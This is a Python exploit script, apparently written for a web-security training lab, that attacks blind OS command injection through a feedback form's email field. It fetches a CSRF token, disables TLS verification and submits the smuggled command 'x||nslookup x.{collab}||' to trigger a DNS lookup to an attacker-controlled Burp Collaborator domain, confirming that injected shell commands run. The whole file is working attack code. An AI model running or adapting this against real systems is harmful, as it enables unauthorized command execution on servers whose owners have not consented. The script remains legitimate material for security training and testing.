"""
Lab: Blind OS command injection with out-of-band interaction

This script exploits a blind OS command injection vulnerability using out-of-band (OAST) interaction.

Steps:
1. Send feedback with the email parameter set to: x||nslookup x.BURP-COLLABORATOR-SUBDOMAIN||
   (Replace BURP-COLLABORATOR-SUBDOMAIN with your actual Collaborator payload)
2. Monitor Burp Collaborator for DNS interaction to confirm the exploit

Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--collab', required=True, help='Burp Collaborator subdomain (e.g., abcdef1234.burpcollaborator.net)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    collab = args.collab
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    # Step 1: Send feedback with OAST payload
    feedback_url = f"{url}/feedback/submit"
    csrf_token = get_csrf(session, f"{url}/feedback")
    data = {
        "name": "attacker",
        "email": f"x||nslookup x.{collab}||",
        "subject": "test",
        "message": "test",
        "csrf": csrf_token
    }
    print(f"{Fore.YELLOW}[*] Sending feedback with OAST payload...{Fore.RESET}")
    r = session.post(feedback_url, data=data)
    print(f"{Fore.GREEN}[+] Feedback submitted. Status code: {r.status_code}{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] Check Burp Collaborator for DNS interaction to confirm the exploit.{Fore.RESET}")

def get_csrf(session, page_url):
    r = session.get(page_url)
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on feedback page{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()
